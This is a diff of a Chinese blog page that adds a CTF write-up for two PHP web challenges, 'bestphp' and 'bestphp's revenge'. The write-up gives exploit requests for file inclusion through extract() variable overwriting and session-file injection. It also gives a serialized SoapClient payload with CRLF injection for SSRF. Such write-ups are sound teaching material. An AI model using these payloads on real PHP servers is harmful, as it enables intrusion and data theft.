@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>阿杰的小站</title>
+    <title>2018-Xctf Final &amp; bestphp-revenge · 阿杰的小站</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >阿杰的小站</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2018-Xctf Final & bestphp-revenge</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>阿杰的小站</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            2018-Xctf Final & bestphp-revenge
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">704</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/08/31</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,53 +399,62 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/05/21/Beautifulsoup解析/" >
-            
-                <span>BeautifulSoup解析</span>
-        </a>
-        <div class="abstract-content">
-            概念一个节点可以由5个部分来概括
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="bestphp"><a href="#bestphp" class="headerlink" title="bestphp"></a>bestphp</h2><p>考点：变量覆盖+lfi+session文件转移<br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&apos;open_basedir&apos;, &apos;C:/www/t/830&apos;);</span><br><span class="line">$file = &apos;function.php&apos;;</span><br><span class="line">$func = isset($_GET[&apos;function&apos;]) ? $_GET[&apos;function&apos;] : &apos;filters&apos;;</span><br><span class="line">call_user_func($func, $_GET);</span><br><span class="line">include $file;</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;name&apos;] = $_POST[&apos;name&apos;];</span><br><span class="line">if ($_SESSION[&apos;name&apos;] == &apos;admin&apos;) &#123;</span><br><span class="line">	header(&apos;location:admin.php&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>关键代码在<code>call_user_func</code>，第二个参数为<code>$_GET</code>数组，我们无法控制<code>$_GET</code>整个的值，但是能控制其键和名，可以想到使用变量覆盖<code>extract</code>函数覆盖file值，进行文件包含。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
+<p>可以看到function.php和admin.php源码，但用处不大</p>
+<p>open_basedir被限制了，可以通过<code>session_start</code>的参数选项进行修改session文件存储位置<br><img src="/img/1567235922169.png" alt="">，同样配置参数的第二个选项也是使用数组，因此也能配置。<br>但是options方式只有在php7.0以上才支持。</p>
+<p>因此我们的思路：先通过session_start修改session文件位置，通过POST传递name控制SESSION文件内容，利用extract控制file变量进行文件包含。<br>第一步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?function=session_start&amp;save_path=C:\www\t\830</span><br><span class="line">name=&lt;?=phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>第二步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?function=extract&amp;file=C:\www\t\830\sess_7c2nmq4a93e9k3adi32b647a31</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/1567237317824.png" alt=""></p>
+<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p>考点：soap ssrf+session 反序列化+变量覆盖+session_start小技巧<br>环境搭建了一天还是没搞好，还是记录一下<br>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b,$a);</span><br></pre></td></tr></table></figure></p>
+<p>flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">echo &apos;only localhost can get flag!&apos;;</span><br><span class="line">$flag = &apos;LCTF&#123;*************************&#125;&apos;;if ($_SERVER[&quot;REMOTE_ADDR&quot;] === &quot;127.0.0.1&quot;) &#123;$_SESSION[&apos;flag&apos;] = $flag;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>题目意思就是需要通过本地ip来访问flag.php，大体思路就是制造SSRF。<br>通过<code>session_start</code>和<code>call_user_func</code>我们可以利用前一题的思路，利用<code>session_start</code>的参数<code>serialize_handler=php_serialize</code>使得传入和解析session方式不同，就能制造出session反序列化漏洞</p>
+<p>那么构造什么类，可以利用php内置类SoapClient来进行SSRF攻击，触发SSRF，需要类中的<code>__call</code>函数来触发，而要触发<code>__call</code>需要访问类中不存在的方法</p>
+<p>如何访问不存在的方法，需要第二次请求，利用第一个<code>call_user_func</code>进行变量覆盖，将<code>$b</code>覆盖为<code>call_user_func</code>来访问方法，而将<code>$_SESSION[name]</code>赋值为<code>SoapClient</code>就能够对该对象的静态方法<code>welcome_to_the_lctf2018</code>进行访问，实际是对<code>__call</code>函数访问。</p>
+<p>第一次请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.104/t/830/bestphp/?name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A39%3A%22http%3A%2F%2F127.0.0.1%2Ft%2F830%2Fbestphp%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3D2bijd8knc92gvbfjrhs34tr2v2%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;f=session_start</span><br><span class="line"></span><br><span class="line">serialize_handler=php_serialize</span><br></pre></td></tr></table></figure></p>
+<p>第二次请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.104/t/830/bestphp/?name=Soapclient&amp;f=extract</span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure></p>
 
-节点名
-节点内容
-子节点
-父亲节点
-属性
-
-所以我们主要围绕两个问题：
-
-如何获得相应节点
-如何从该节点获得我们需要的信息
-
-获得节点soup.p：获得第一个p标签节点soup.find_all(&quot;p&quot;)：获得所有p标签节点组成的listsoup.find(id=&quot;link3&quot;)：通过id选择器获得指定节点
-获得信息soup.p.name：获得节点名soup.p.text：获得节点文字内容包含子节点soup.p.string：获得节点文字内容soup.p[&quot;class&quot;]：获得属性内容soup...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "编程">编程</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Kage</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/08/31/2018-Xctf Final & bestphp-revenge/">http://yoursite.com/2019/08/31/2018-Xctf Final & bestphp-revenge/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/08/31/2018-Xctf Final & bestphp-revenge/">八月 31日 2019, 9:49:49 晚上</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/08/31/2018-Xctf Final & bestphp-revenge/">August 31st 2019, 9:49:49 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/08/30/session.upload_progress的利用/" title= "session.upload_progress的利用">
+                    <div class="prevTitle">session.upload_progress的利用</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -466,6 +536,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bestphp"><span class="toc-number">1.</span> <span class="toc-text">bestphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bestphp’s-revenge"><span class="toc-number">2.</span> <span class="toc-text">bestphp’s revenge</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1003,6 +1091,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
